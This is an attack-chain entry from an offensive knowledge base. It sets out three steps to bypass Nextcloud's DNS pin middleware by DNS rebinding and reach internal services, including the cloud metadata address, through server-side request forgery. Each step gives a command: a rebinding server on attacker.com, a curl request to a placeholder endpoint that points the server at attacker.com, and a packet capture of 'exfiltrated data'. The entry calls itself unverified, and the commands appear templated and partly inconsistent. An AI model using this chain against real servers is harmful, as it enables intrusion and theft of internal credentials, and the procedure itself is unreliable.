---
tags:
  - ssrf
  - dns-rebinding
  - nextcloud
  - bypass
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-DNS-Rebinding-for-SSRF-in-Nextcloud]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:53:38.635Z'
description: >-
  An attack chain exploiting DNS rebinding to bypass Nextcloud's DNS pin
  middleware, enabling Server-Side Request Forgery (SSRF) to access internal
  resources.
skill_level: intermediate
impact_level: high
id: d3e9cc51-d2df-4053-805b-ab43e6432192
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# SSRF via DNS Rebinding in Nextcloud DNS Pin Middleware

Multi-stage attack chain demonstrating a complete attack workflow exploiting a vulnerability in Nextcloud's DNS pin middleware through DNS rebinding to achieve SSRF.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~15 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup DNS Rebinding Domain] --> B[Craft Malicious Request to Nextcloud]
    B --> C[Trigger SSRF to Internal Resources]
    C --> D[Access Restricted Endpoints]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/dns-rebind-toolkit]]

### Target Environment

- Nextcloud instance running on PHP-based web server
- Access to a domain for DNS rebinding setup
- Network access to the Nextcloud server

### Initial Access Requirements

- Public-facing Nextcloud endpoint
- No authentication required for the vulnerable middleware
- Ability to control DNS resolutions

## Detailed Attack Procedures

### Step 1: Setup DNS Rebinding Domain
procedure: [[procedures/Exploit-DNS-Rebinding-for-SSRF-in-Nextcloud]]

**Objective**: Configure a DNS server to perform rebinding, resolving to attacker-controlled IP initially and then to internal target IP.

**Instructions**: Use a DNS rebinding toolkit to set up a domain that resolves to 127.0.0.1 or attacker IP first, then rebinds to the internal service IP (e.g., 169.254.169.254 for metadata).

Execute [[commands/setup-dns-rebinding]] to initialize the server:

```bash
python dns_rebind_server.py --domain attacker.com --bind-ip 127.0.0.1 --target-ip 169.254.169.254 --port 80
```

**Expected Output**: DNS server running, confirming rebinding setup with logs showing resolution changes.

**Success Indicators**:
- DNS queries resolve to initial IP, then rebind to target
- Server logs confirm active listening

### Step 2: Craft Malicious Request to Nextcloud
procedure: [[procedures/Exploit-DNS-Rebinding-for-SSRF-in-Nextcloud]]

**Objective**: Send a request to Nextcloud's DNS pin middleware using the rebinding domain to bypass pinning.

**Instructions**: Use curl to send a request that triggers the middleware to resolve the domain, exploiting the lack of validation against rapid changes.

Execute [[commands/curl-ssrf-trigger]] pointing to the Nextcloud endpoint with the rebinding domain:

```bash
curl -X POST 'https://nextcloud-target.com/vulnerable-endpoint' -d 'url=http://attacker.com/internal-resource' --resolve attacker.com:443:attacker-ip
```

**Expected Output**: Nextcloud processes the request, resolving the domain and initiating an internal fetch.

**Success Indicators**:
- HTTP response from Nextcloud without pinning error
- Network traffic shows resolution to internal IP

### Step 3: Trigger SSRF to Internal Resources
procedure: [[procedures/Exploit-DNS-Rebinding-for-SSRF-in-Nextcloud]]

**Objective**: Leverage the bypassed pinning to make unauthorized requests to internal services.

**Instructions**: Monitor the rebinding server for incoming SSRF requests and capture data from internal endpoints.

Execute [[commands/monitor-rebind-traffic]] to observe exfiltrated data:

```bash
tcpdump -i any port 80 -w ssrf_capture.pcap
```

**Expected Output**: Captured packets showing requests to internal IPs and any sensitive data returned.

**Success Indicators**:
- Internal service responses visible in captures
- Access to restricted endpoints confirmed

## Attack Chain Summary

### Key Achievements

1. Successful bypass of DNS pinning via rebinding
2. Execution of SSRF to internal resources
3. Potential exfiltration of sensitive internal data

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]

---
*Last updated: 2023-10-01T00:00:00Z*
